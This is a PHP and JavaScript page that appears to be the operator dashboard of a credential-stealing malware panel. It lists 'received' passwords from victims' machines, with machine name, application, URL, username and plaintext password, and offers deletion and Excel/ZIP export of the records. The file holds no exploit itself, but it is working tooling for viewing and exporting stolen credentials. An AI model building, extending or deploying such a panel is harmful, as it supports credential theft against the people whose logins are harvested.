<?php

	$json_data = array(
		array( 'db' => 'password_id',  'dt' => 'password_id' ),
		array( 'db' => 'server_time',  'dt' => 'server_time' ),
		array( 'db' => 'pc_name',   'dt' => 'pc_name' ),
		array( 'db' => 'client',   'dt' => 'client' ),
		array( 'db' => 'host',   'dt' => 'host' ),
		array( 'db' => 'username',   'dt' => 'username' ),
		array( 'db' => 'pwd',   'dt' => 'pwd' )
		);
	$str = urlencode(serialize($json_data));
	
?>
		<div id="page-wrapper">
            <div class="container-fluid">
                <div class="row bg-title">
                    <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
                        <h4 class="page-title">Passwords Recovered</h4>
                    </div>
                </div>

				<div class="row">
					<div class="col-md-12 col-lg-12 col-sm-12">
						<div class="white-box">
							<h3 class="box-title m-b-0">Received Passwords</h3>
                            <p class="text-muted m-b-30">Here you can view all your passwords.</p>
							<div class="table-responsive">
								<style>
									.dt-buttons{margin-left: 10px;}
									.btn-danger-custom{background: #d9534f !important;background-color: #d9534f !important;border-color: #d9534f !important;}
									.btn-danger-custom:hover{background: #fff !important;background-color: #fff !important;border: 1px solid #999 !important;}
									.paginate_input{max-width: 50px;padding: 0 5px;}
									.dataTables_wrapper .dataTables_paginate .paginate_button{padding: 0.3em 0.5em;}
								</style>
                                <table class="table table-striped table-bordered table-hover dataTables-Passwords" cellspacing="0" width="100%">
									<?php

									echo '
									<thead>
									<tr>
									';
									echo '
									<th></th>
									<th>Time</th>
									<th>Machine Name</th>
									<th>Application</th>
									<th>URL</th>
									<th>Username</th>
									<th>Password</th>
									<th>Action</th>
									</tr>
									</thead>
									';
									?>						 
                                </table>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	
	<script>
		$(document).ready(function() {
			var table = $('.dataTables-Passwords').DataTable({
				"order": [[ 1, "desc" ]],
                dom: 'Bfrtip',
				"processing": true,
				"serverSide": true,
				"ajax": "scripts/process.php?table=passwords&primary=password_id&clmns=<?php echo $str; ?>",
				'columnDefs': [
					 {
						'targets': 0,
						'checkboxes': {
						   'selectRow': true
						},
						defaultContent:""
					 }
				],
				'select': {
					 'style': 'multi'
				},
				"columns": [
							{ "data": "password_id" },
							{ "data": "server_time" },
							{ "data": "pc_name" },
							{ "data": "client" },
							{ "data": "host" },
							{ "data": "username" },
							{ "data": "pwd" },
							{ "data": null,
							 "render": function ( data, type, row ) {
								 return '<a href=delete.php?type=password&id=' +data["password_id"]+' class="btn btn-outline btn-danger btn-sm" onclick="return confirm(\'Are you sure you want to delete this?\')">Delete</a>';
							 }
							}
				],
                dom: 'lBfrtip',
				"pagingType": "input",
                buttons: [
					{
						text: '<span class="glyphicon glyphicon-trash"></span>',
						className: 'btn btn-danger-custom',
						action: function ( e, dt, node, config ) {
							SelectedArray();
						}
					},
					{
						extend: 'collection',
						text: 'Export',
						className: 'btn btn-default',
						buttons: [{
							text: 'Excel',
							action: function ( e, dt, node, config ) {
								var request = new XMLHttpRequest();
								request.open('GET', "export.php?type=passwords&mime=xls", true);
								request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
								request.responseType = 'blob';

								request.onload = function(e) {
									if (this.status === 200) {
										var blob = this.response;
										if(window.navigator.msSaveOrOpenBlob) {
											window.navigator.msSaveBlob(blob,  "Accounts.xls");
										}
										else{
											var downloadLink = window.document.createElement('a');
											var contentTypeHeader = request.getResponseHeader("Content-Type");
											downloadLink.href = window.URL.createObjectURL(new Blob([blob], { type: contentTypeHeader }));
											downloadLink.download =  "Accounts.xls";
											document.body.appendChild(downloadLink);
											downloadLink.click();
											document.body.removeChild(downloadLink);
										   }
									   }
								};
								request.send();
							}
						}, {
							text: 'HTML',
							action: function ( e, dt, node, config ) {
								$.get( "export.php?type=passwords&mime=zip", function( data ) {
									var result = $.parseJSON(data);
									if(result.success){
										var x=new XMLHttpRequest();
										x.open("GET", result.path, true);
										x.responseType = 'blob';
										x.onload=function(e){download(x.response, "Accounts.zip", "application/zip" ); }
										x.onreadystatechange = function() {
											if (x.readyState === 4 && x.status === 200) {
												$.get( "delete.php?type=file&path=" + encodeURIComponent(result.path), function( data ) {});
											}
										}
										x.send();
									}
									else
										console.log(result.success);
								});
							}
						}]
					}
				]
            });
			function SelectedArray(){
				if(confirm("Are you sure you want to delete selected records?")){
					var rows_selected = table.column(0).checkboxes.selected();
					$.get("delete.php", { 'type': 'password', 'id[]' : rows_selected.join(',').split(',') });
					table.ajax.reload();
				}
			}
		});
    </script>